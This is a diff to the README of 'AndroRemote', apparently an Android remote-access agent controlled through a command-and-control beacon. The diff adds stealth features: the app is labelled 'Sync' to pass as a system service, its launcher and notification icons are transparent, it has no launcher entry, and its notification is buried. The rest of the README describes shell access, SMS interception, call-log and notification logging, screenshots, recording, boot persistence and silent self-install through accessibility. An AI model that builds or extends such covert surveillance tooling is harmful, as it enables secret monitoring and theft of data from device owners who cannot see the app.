@@ -1,6 +1,6 @@
 # AndroRemote
 
-Headless Android 15 remote-management agent + host-side tooling. The APK has **no GUI and is hidden**: no launcher icon, no recents entry, no visible activity, lockscreen-secret notifications. Everything is driven from your terminal.
+Headless Android 15 remote-management agent + host-side tooling. The APK has **no GUI and is hidden**: no launcher entry, blank app icon, `Sync` label, no recents entry, no visible activity, blank status-bar icon with an empty IMPORTANCE_MIN notification. Everything is driven from your terminal.
 
 ```
 ┌──────────────┐   adb forward tcp:8741→tcp:8740   ┌─────────────────────────┐
@@ -56,7 +56,7 @@ Two channels, both always active when configured:
 | `androremote.py` | adb-direct CLI wrapper (backward compatibility) |
 | `build.sh` | APK build (optional C2 URL argument) |
 | `app/src/main/java/com/ohmpi/androremote/` | `RemoteService` (TCP server + all ops), `C2Beacon` (HTTP beacon), `CaptureService` (MediaProjection screenshots), `MainActivity` (invisible; permissions + capture consent once, then finishes), `RemoteAccessibilityService` (input injection + install auto-confirm + keep-alive), `UpdateReceiver` (installer status), `NotifsListener` (notification log), `BootReceiver`, `SmsReceiver` |
-| `app/src/main/res/` | avatar drawables/animators, launcher icon, `values/c2.xml` (baked C2 URL) |
+| `app/src/main/res/` | transparent launcher + notification icons (stealth), `values/c2.xml` (baked C2 URL) |
 | `keystore/release.keystore` | signing key, storepass `androremote` |
 | `build/apk/androremote.apk` | output |
 
@@ -307,14 +307,14 @@ POST /r/<id>                 -> body = command result
 `/sdcard/Android/data/com.ohmpi.androremote/files/logs/sms_<timestamp>.txt` as `from=<sender>\n<body>`.
 Read via `log` / `smslog` on either channel.
 
-## Avatar
+## Stealth appearance
 
-No GUI, so the avatar lives on the icons:
+The APK is fully disguised on-device:
 
-- **Notification** (persistent FGS notification): `avatar_anim` — an `AnimatedVectorDrawable` face (ring head, dot eyes, smile arc) whose eyes glide left↔right forever (`animator/eyes_look.xml`, infinite reverse).
-- **Launcher**: adaptive icon `mipmap-anydpi-v26/ic_launcher` — same face, white on `#0D1117`.
-
-Small notification icons are rendered as white-alpha silhouettes by Android — the face shape survives, colors do not.
+- **App label**: `Sync` — matches the notification channel name, reads as a system service in Settings → Apps.
+- **Launcher icon**: adaptive icon with a fully transparent background and foreground (`ic_launcher_bg`, `avatar_foreground`) — renders blank wherever icons appear; no default/gear fallback because a valid (invisible) drawable is set.
+- **Notification small icon**: `ic_notify` — fully transparent, so the status-bar icon is a blank pixel; the FGS notification itself is `IMPORTANCE_MIN` + `PRIORITY_MIN` + `VISIBILITY_SECRET` with empty title/text, so it has no status-bar presence and only a blank row deep in the expanded shade.
+- No MAIN/LAUNCHER intent-filter: the app never appears in the launcher drawer or home screen.
 
 ## Remote control (accessibility)
 
@@ -524,6 +524,6 @@ Bugs fixed during device bring-up: server `do_POST` matched the raw path (query 
 
 ## Verification status
 
-E2E-verified on an Android 15 (API 35) emulator: build chain, install, boot autostart, all 12 original permissions, shell, file round-trips (raw + base64, md5-checked), SMS receive+log, screenshot via adb fallback, C2 over a live Cloudflare tunnel (list/use/ping/shell/put/get/perms/ls/help), notification avatar icon resource, and the bug list in Troubleshooting.
+E2E-verified on an Android 15 (API 35) emulator: build chain, install, boot autostart, all 12 original permissions, shell, file round-trips (raw + base64, md5-checked), SMS receive+log, screenshot via adb fallback, C2 over a live Cloudflare tunnel (list/use/ping/shell/put/get/perms/ls/help), and the bug list in Troubleshooting. Stealth round (build-verified, pending on-device re-verify): `Sync` label + no launchable activity confirmed via `aapt2 dump badging`; transparent `ic_launcher` + transparent `ic_notify` small icon compiled into the APK.
 
 Not yet exercised on hardware (last change sets): `SMS` send, `CALL`/`CALLLOG` (may be restricted by carrier/MIUI default-dialer rules), `RECORD`, `SWIPE`/`SETTEXT`, self-update chain (`INSTALL` → auto-confirm → restart), `TORCH`/`VOL`/clipboard/notification-listener ops. Compile- and build-verified only. Server-side multi-client, broadcast, pipelining, and the Cloudflare tunnel path are verified live. **Latest round, live-verified:** AES-256-GCM ENC1 round-trips (sessions show `AES-GCM`), wrong-key agent rejected (cannot decrypt commands, times out), TLS listener + cert pin (`--tls`), and cloudflared kill→respawn (~8s, new URL, server kept running).
